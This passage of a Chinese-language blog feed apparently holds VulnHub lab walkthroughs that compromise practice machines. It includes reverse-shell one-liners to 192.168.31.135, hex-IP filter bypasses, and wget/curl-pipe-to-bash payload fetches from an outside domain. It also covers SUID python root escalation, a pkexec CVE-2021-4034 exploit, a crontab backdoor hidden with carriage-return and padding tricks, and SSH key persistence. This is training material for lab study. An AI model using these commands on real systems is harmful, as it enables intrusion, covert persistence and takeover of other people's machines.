class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">这是一个python反弹shell的代码，尝试运行</span></span><br><span class=\"line\">.run python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.135 &quot;,4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-188.png\" alt></p>\n<p>作为 waldo，我运行 .run 并从机器人收到 FileNotFound 错误。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FileNotFoundError: [Errno 2] No such file or directory: &#x27;None&#x27; (file &quot;/usr/lib/python3.5/subprocess.py&quot;, line 1551, in _execute_child)</span><br></pre></td></tr></table></figure>\n<p>adm 组确实看起来很有希望。由于 .run 需要一个文件，因此我创建了一个包含以下内容的文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">sudo -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用具有s权限的python进行提权, 修改下一个脚本以将 suid 位应用于 python 可执行文件：</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">sudo chmod 4777 /usr/bin/python2.7</span><br></pre></td></tr></table></figure>\n<p>通过 irssi 执行此脚本，将 python2.7 添加上 SUID 权限<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-189.png\" alt></p>\n<p>此后可以退出 irssi 了 /quit</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls - al /usr/bin/python2.7</span><br><span class=\"line\">python -c &quot;import os; os.setuid(0); os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-190.png\" alt></p>\n<p>提权成功拿到了 root 权限</p>\n<h3 id=\"隐蔽cron权限维持\"><a class=\"markdownIt-Anchor\" href=\"#隐蔽cron权限维持\">#</a> 隐蔽 cron 权限维持</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前计划任务有哪些</span> </span><br><span class=\"line\">crontab -l</span><br><span class=\"line\"></span><br><span class=\"line\">cat &gt; /root/.first.sh &lt;&lt;EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1</span><br><span class=\"line\">EOF</span><br><span class=\"line\"></span><br><span class=\"line\">cat &gt; /root/.second.sh &lt;&lt; EOF</span><br><span class=\"line\">(crontab -l;printf &quot;*/1 * * * * /root/.first.sh;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">*/1 * * * *：每隔 1 分钟执行一次；</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/r：<span class=\"built_in\">cat</span>默认支持 \\r 回车符 \\n 换行符 \\f 换页符这些符号，会导致显示截断隐藏命令，隐藏真实的计划任务；</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">%100c：格式化输出一个字符，前面 99 个空格补齐。使用空格帮助我们把前面的内容在 crontab 中遮盖掉；</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果想让创建的文件隐蔽性更强，可以创建名为<span class=\"string\">&quot;..&quot;</span>、“...”或以..等开头的文件。</span></span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 .first.sh</span><br><span class=\"line\">chmod 777 .second.sh</span><br><span class=\"line\">/root/.second.sh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-191.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果发现无法运行，可以通过下列两个命令查看详细计划任务</span></span><br><span class=\"line\">cat /var/spool/cron/crontabs/root -A</span><br><span class=\"line\">crontab -e 或者 vi /etc/crontab</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在kali机器上监听 4444 端口，每隔一分钟收到将会一次shell</span></span><br><span class=\"line\">nc - lvvp 4444</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行一下命令产生一个标准的shell：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-192.png\" alt></p>\n<p>-&gt; 只要开启 kali 的 4444 端口，很快就会收到 root 账户的 shell</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/105%20EARTH/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/105%20EARTH/",
            "title": "VULNHUB 5 EARTH",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtZWFydGgsNzU1Lw==\">https://www.vulnhub.com/entry/the-planets-earth,755/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbGVjYWxpZGEvYXJ0aWNsZS9kZXRhaWxzLzEyMTMxNjkzNA==\">https://blog.csdn.net/valecalida/article/details/121316934</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-060.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-061.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.67</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31. 67 -oN /tmp/earth.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-062.png\" alt></p>\n<h3 id=\"修改本地-hosts\"><a class=\"markdownIt-Anchor\" href=\"#修改本地-hosts\">#</a> 修改本地 Hosts</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjc=\">http://192.168.31.67</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMxLjY3\">https://192.168.31.67</span> 发现两个网址都无法打开<br>\n注意到端口扫描的结果中， 443 中有如下说明：<br>\nSubject Alternative Name: DNS:earth.local, DNS:terratest.earth.local<br>\n 尝试修改本地 hosts 文件，将这两个域名解析指向 192.168.31.67</p>\n<p><code>sudo echo ‘192.168.31.67 earth.local terratest.earth.local’ &gt;&gt; /etc/hosts</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-063.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 更多信息暴露，有了更多的攻击面：<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2VhcnRoLmxvY2FsLw==\">http://earth.local/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lYXJ0aC5sb2NhbC8=\">https://earth.local/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3RlcnJhdGVzdC5lYXJ0aC5sb2NhbC8=\">http://terratest.earth.local/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwv\">https://terratest.earth.local/</span></p>\n<h3 id=\"目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#目录扫描\">#</a> 目录扫描</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovL2VhcnRoLmxvY2FsLw==\">http://earth.local/</span></p>\n<p>对此网站进行目录扫描<br>\n <code>dirsearch -u http://earth.local</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-064.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"弱口令测试\"><a class=\"markdownIt-Anchor\" href=\"#弱口令测试\">#</a> 弱口令测试</h3>\n<p>登录地址：<span class=\"exturl\" data-url=\"aHR0cDovL2VhcnRoLmxvY2FsL2FkbWluL2xvZ2lu\">http://earth.local/admin/login</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-065.png\" alt></p>\n<h3 id=\"其他网址测试\"><a class=\"markdownIt-Anchor\" href=\"#其他网址测试\">#</a> 其他网址测试</h3>\n<p>对其他三个网站进行目录扫描</p>\n<p><code>dirsearch -u https://earth.local/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-066.png\" width=\"380\" alt=\"Image\">\n<p><code>dirsearch -u http://terratest.earth.local/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-067.png\" width=\"380\" alt=\"Image\">\n<p><code>dirsearch -u https://terratest.earth.local/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-068.png\" width=\"340\" alt=\"Image\">\n<p>-&gt; 发现目录：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvcm9ib3RzLnR4dA==\">https://terratest.earth.local/robots.txt</span></p>\n<p>对 https://terratest.earth.local/robots.txt 进行分析</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-069.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 发现可疑地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGluZ25vdGVzLnR4dA==\">https://terratest.earth.local/testingnotes.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-070.png\" width=\"480\" alt=\"Image\">\n<p>下一步攻击思路，首页打开的数字字母的排列组合是 xor 加密运算</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-071.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGRhdGEudHh0\">https://terratest.earth.local/testdata.txt</span> 为测试加密数据</p>\n<p>管理用户中有管理员：terra</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-072.png\" alt></p>\n<h3 id=\"xor-加密破解\"><a class=\"markdownIt-Anchor\" href=\"#xor-加密破解\">#</a> Xor 加密破解</h3>\n<p>编写 python 脚本，以 testdata.txt 为密钥，并注意删除其后面的空行，对首页得到的三份数据进行解密</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; 1.py &lt;&lt; EOF</span><br><span class=\"line\">import binascii</span><br><span class=\"line\">data1 =</span><br><span class=\"line\">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span><br><span class=\"line\">f = binascii.b2a_hex(open(&#x27;testdata.txt&#x27;, &#x27;rb&#x27;).read()).decode()</span><br><span class=\"line\">print(hex(int(data1,16) ^ int(f,16)))</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-073.png\" alt></p>\n<p>在线 16 进制数据转为字符串：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5hYjE3My5jb20vY29udmVydC9veDJzdHIucGhw\">http://www.ab173.com/convert/ox2str.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-074.png\" alt></p>\n<p>-&gt; 去掉重复值得到：earthclimatechangebad4humans</p>\n<h3 id=\"账户密码利用\"><a class=\"markdownIt-Anchor\" href=\"#账户密码利用\">#</a> 账户密码利用</h3>\n<ol>\n<li>已有凭据<br>\n现在已成功拥有账户：terra<br>\n 密码：earthclimatechangebad4humans<br>\n 尝试进行连接：ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnRlcnJhQDE5Mi4xNjguMzEuNjc=\">terra@192.168.31.67</span></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-075.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 排除掉这是 ssh 的用户和密码</p>\n<ol start=\"2\">\n<li>从之前得到的网址尝试登陆<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lYXJ0aC5sb2NhbC9hZG1pbi9sb2dpbg==\"> https://earth.local/admin/login</span></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-076.png\" alt></p>\n<ol start=\"3\">\n<li>登陆成功，发现 RCE 代码执行漏洞</li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-077.png\" alt></p>\n<h3 id=\"rce-漏洞反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#rce-漏洞反弹shell\">#</a> RCE 漏洞反弹 shell</h3>\n<ol>\n<li>从之前得到的网址尝试登陆</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从最基础的反弹shell的命令尝试发现被过滤：</span></span><br><span class=\"line\">bash -c &quot;bash -i&gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">这里过滤的是ip地址，可将ip地址改为十六进制绕过：</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x1f.0x87/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者连接到有域名的网址 [http://www.chentuo.asia](http://www.chentuo.asia)</span></span><br><span class=\"line\">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">采用以下几种方法尝试下马执行</span></span><br><span class=\"line\">wget http://www.chentuo.asia/shell.sh &amp;&amp; chmod +x shell.sh &amp;&amp; ./shell.sh</span><br><span class=\"line\">wget http://www.chentuo.asia/shell.sh &amp;&amp; sh shell.sh</span><br><span class=\"line\">curl http://www.chentuo.asia/shell.sh | bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-078.png\" alt></p>\n<ol start=\"2\">\n<li>得到一个标准的 shell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class=\"line\">stty raw -echo;fg then press ENTER twice</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-079.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"pkexec-权限提升\"><a class=\"markdownIt-Anchor\" href=\"#pkexec-权限提升\">#</a> Pkexec 权限提升</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看靶机上的pkexec是否存在s权限：</span></span><br><span class=\"line\">ls - Alh `which pkexec`</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在攻击机kali上下载poc：</span></span><br><span class=\"line\">wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解压poc：</span></span><br><span class=\"line\">unzip master.zip</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从靶机上获取poc：</span></span><br><span class=\"line\">scp -r parallels@192.168.31.135:~/Desktop/tool/pkexec/CVE-2021-4034-main /tmp</span><br><span class=\"line\">cd /tmp/CVE-2021-4034-main &amp;&amp; make &amp; ./CVE-2021-4034</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-080.png\" width=\"620\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取标准 shell</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-081.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"密钥对维权\"><a class=\"markdownIt-Anchor\" href=\"#密钥对维权\">#</a> 密钥对维权</h3>\n<p>提前准备好配对好的私钥和公钥，将公钥发到靶机</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/</span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; rm -f id_rsa.pub</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-082.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ll | grep id</span><br><span class=\"line\">ssh root@192.168.31.127 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-083.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 免密成功，下次可直接登录</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        }
    ]
}